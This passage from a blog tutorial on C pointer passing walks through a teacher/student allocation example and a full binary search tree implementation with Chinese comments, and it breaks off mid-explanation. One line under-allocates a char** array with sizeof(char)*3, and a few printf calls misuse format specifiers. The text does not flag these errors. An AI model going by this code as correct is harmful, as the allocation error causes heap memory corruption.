class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//(*p)-&gt;stu=(char **)malloc (sizeof(char*)*3);</span></span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">        &#123;</span><br><span class="line">         (p)[j].stu=(<span class="keyword">char</span> **)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">3</span>); </span><br><span class="line">         <span class="keyword">if</span> ((p)[j].stu == <span class="literal">NULL</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;<span class="number">3</span>;k++)</span><br><span class="line">         &#123;</span><br><span class="line">         (p)[j].stu[k]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">20</span>);</span><br><span class="line">         <span class="keyword">if</span> ((p)[j].stu[k] == <span class="literal">NULL</span>)</span><br><span class="line">             &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Modify the code in <em>main()</em>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = createTeacher2(p, n1, n2);</span><br></pre></td></tr></table></figure><p>This code can be correctly compiled and if we run the program we will get stuck in the step of <em>initTeacher</em>. Because the pointer <em>p</em> passed to <em>createTeacher2</em> wasn’t allocated memory due to the pass-by-value feature. In other words, the pointer <em>p</em> in the <em>main()</em> block will always point to NULL. </p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/5-2.png" alt></p><p>To fix it, we should use the double pointer to pass the address of pointer <em>p</em>.</p><p>There is another example we should take care of. Here is an implement of a binary search tree.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//binarysearchtree.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __BINARY_SEARCH_TREE__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __BINARY_SEARCH_TREE__</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> mytype;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">bstree_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">mytype data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">bstree_node</span> *<span class="title">lchild</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">bstree_node</span> *<span class="title">rchild</span>;</span></span><br><span class="line">&#125;bstree_node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">bstree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> (*compare)(mytype key1,mytype key2);</span><br><span class="line"><span class="keyword">int</span> (*destory)(mytype data);</span><br><span class="line">bstree_node *root;</span><br><span class="line">&#125;bstree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*compare_fuc)</span><span class="params">(mytype key1,mytype key2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*destory_fuc)</span><span class="params">(mytype data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bstree_is_empty(tree)  (tree-&gt;size == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="function">bstree *<span class="title">bstree_create</span><span class="params">(compare_fuc compare,destory_fuc destory)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//binarysearchtree.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"binarysearchtree.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">bstree *<span class="title">bstree_create</span><span class="params">(compare_fuc compare,destory_fuc destory)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bstree *tree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">tree = (bstree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bstree));</span><br><span class="line"><span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tree-&gt;size = <span class="number">0</span>;</span><br><span class="line">    tree-&gt;compare = compare;</span><br><span class="line">    tree-&gt;destory = destory;</span><br><span class="line">tree-&gt;root = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">bstree_node *<span class="title">bstree_search</span><span class="params">(bstree *tree,mytype data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    node = tree-&gt;root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(node != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">res = tree-&gt;compare(data,node-&gt;data);</span><br><span class="line"><span class="keyword">if</span>(res == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (res &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">node = node-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">node = node-&gt;lchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bstree_insert</span><span class="params">(bstree * tree, mytype data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"second ptr address: %p"</span>, &amp;tree);</span><br><span class="line">    bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">    bstree_node *tmp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node = (bstree_node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bstree_node));</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node-&gt;data = data;</span><br><span class="line">node-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">node-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*如果二叉树为空，直接挂到根节点*/</span></span><br><span class="line"><span class="keyword">if</span> (bstree_is_empty(tree))</span><br><span class="line">&#123;</span><br><span class="line">        tree-&gt;root = node;</span><br><span class="line">tree-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmp = tree-&gt;root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">res = tree-&gt;compare(data,tmp-&gt;data);</span><br><span class="line"><span class="keyword">if</span> (res &gt; <span class="number">0</span>) <span class="comment">/*去右孩子查找*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;rchild = node;</span><br><span class="line">tree-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    tmp = tmp-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">/*去左孩子查找*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(tmp-&gt;lchild == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;lchild = node;</span><br><span class="line">tree-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">tmp = tmp-&gt;lchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bstree_delete</span><span class="params">(bstree *tree,mytype data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;<span class="comment">/*要删除的节点*/</span></span><br><span class="line">bstree_node *pnode = <span class="literal">NULL</span>;<span class="comment">/*要删除节点的父节点*/</span></span><br><span class="line">bstree_node *minnode = <span class="literal">NULL</span>;<span class="comment">/*要删除节点的父节点*/</span></span><br><span class="line">bstree_node *pminnode = <span class="literal">NULL</span>;<span class="comment">/*要删除节点的父节点*/</span></span><br><span class="line">    mytype tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node = tree-&gt;root;</span><br><span class="line"><span class="keyword">while</span> ((node != <span class="literal">NULL</span>) &amp;&amp; ((res = tree-&gt;compare(data,node-&gt;data)) != <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">pnode = node;</span><br><span class="line"><span class="keyword">if</span>(res &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">            node = node-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">            node = node-&gt;lchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*说明要删除的节点不存在*/</span></span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*1、如果要删除node有2个子节点，需要找到右子树的最小节点minnode，</span></span><br><span class="line"><span class="comment"> * 更新minnode和node节点数据，这样minnode节点就是要删除的节点</span></span><br><span class="line"><span class="comment"> * 再更新node和pnode节点指向要删除的节点*/</span></span><br><span class="line"><span class="keyword">if</span> ((node-&gt;lchild != <span class="literal">NULL</span>) &amp;&amp; (node-&gt;rchild != <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">minnode = node-&gt;rchild;</span><br><span class="line">pminnode = node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(minnode-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">pminnode = minnode;</span><br><span class="line">minnode = minnode-&gt;lchild;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*node 节点和minnode节点数据互换*/</span></span><br><span class="line">        tmp = node-&gt;data;</span><br><span class="line">node-&gt;data = minnode-&gt;data;</span><br><span class="line">minnode-&gt;data = tmp;</span><br><span class="line"><span class="comment">/*更新要删除的节点和其父节点*/</span></span><br><span class="line">node = minnode;</span><br><span class="line">pnode = pminnode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*2、当前要删除的节点只有左孩子或者右孩子时，直接父节点的直向删除的节点*/</span></span><br><span class="line"><span class="keyword">if</span> (node-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">        minnode = node-&gt;lchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">minnode = node-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">minnode = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pnode == <span class="literal">NULL</span>)<span class="comment">/*当要删除的时根节点时,*/</span></span><br><span class="line">&#123;</span><br><span class="line">tree-&gt;root = minnode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pnode-&gt;lchild == node)</span><br><span class="line">&#123;</span><br><span class="line">pnode-&gt;lchild = minnode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">pnode-&gt;rchild = minnode;</span><br><span class="line">&#125;</span><br><span class="line">    tree-&gt;size--;</span><br><span class="line"><span class="built_in">free</span> (node);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*采用递归方式删除节点*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bstree_destory_node</span><span class="params">(bstree *tree,bstree_node *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bstree_destory_node(tree,root-&gt;lchild);</span><br><span class="line">bstree_destory_node(tree,root-&gt;rchild);</span><br><span class="line"><span class="built_in">free</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*二叉搜索树销毁*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bstree_destory</span><span class="params">(bstree *tree)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bstree_destory_node(tree,tree-&gt;root);</span><br><span class="line"><span class="built_in">free</span>(tree);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*中序遍历打印树节点*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bstree_inorder_node</span><span class="params">(bstree_node *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bstree_inorder_node(root-&gt;lchild);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d "</span>,root-&gt;data);</span><br><span class="line">bstree_inorder_node(root-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bstree_dump</span><span class="params">(bstree *tree)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n 当前树是空树"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\nSTART-----------------%d------------\r\n"</span>,tree-&gt;size);</span><br><span class="line">bstree_inorder_node(tree-&gt;root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\nEND---------------------------------"</span>,tree-&gt;size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bstree_compare</span><span class="params">(mytype key1,mytype key2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (key1 == key2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (key1 &gt; key2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bstree *tree = <span class="literal">NULL</span>;</span><br><span class="line">bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">mytype data = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">setenv(<span class="string">"MALLOC_TRACE"</span>,<span class="string">"1.txt"</span>,<span class="number">1</span>);</span><br><span class="line">    mtrace();</span><br><span class="line"></span><br><span class="line">tree = bstree_create(bstree_compare,<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"first address: %d"</span>, tree);</span><br><span class="line">assert(tree != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n插入一个数字，输入100时退出："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data);</span><br><span class="line"><span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">res = bstree_insert(tree,data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n %d 插入%s成功"</span>,data,(res != <span class="number">0</span>)?(<span class="string">"不"</span>):(<span class="string">" "</span>));</span><br><span class="line">&#125;</span><br><span class="line">bstree_dump(tree);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n查询一个数字，输入100时退出："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data);</span><br><span class="line"><span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">node = bstree_search(tree,data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n %d %s存在树中"</span>,data,(node == <span class="literal">NULL</span>)?(<span class="string">"不"</span>):(<span class="string">" "</span>));</span><br><span class="line">&#125;</span><br><span class="line">bstree_dump(tree);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n删除一个数字，输入100时退出："</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data);</span><br><span class="line"><span class="keyword">if</span>(data == <span class="number">100</span>)<span class="keyword">break</span>;</span><br><span class="line">res = bstree_delete(tree,data);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n %d 删除%s成功"</span>,data,(res != <span class="number">0</span>)?(<span class="string">"不"</span>):(<span class="string">" "</span>));</span><br><span class="line">    bstree_dump(tree);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bstree_destory(tree);</span><br><span class="line"></span><br><span class="line">    muntrace();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now let’s focus on the first while loop among the <em>main()</em> block. In this case, the pointer <em>tree</em> was directly passed into the function <em>bstree_insert</em>, it’s kind of odd compared with the previous instances. The difference is that the pointer <em>tree</em> has been allocated memory before passed as an argument. </p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/5-3.png" alt></p><p>There are actually two pointers which belong to two different address in the memory, but both of them point to the same space. If we change the value of the space one pointer points to, we simultaneously change the value that the other pointer points to. If 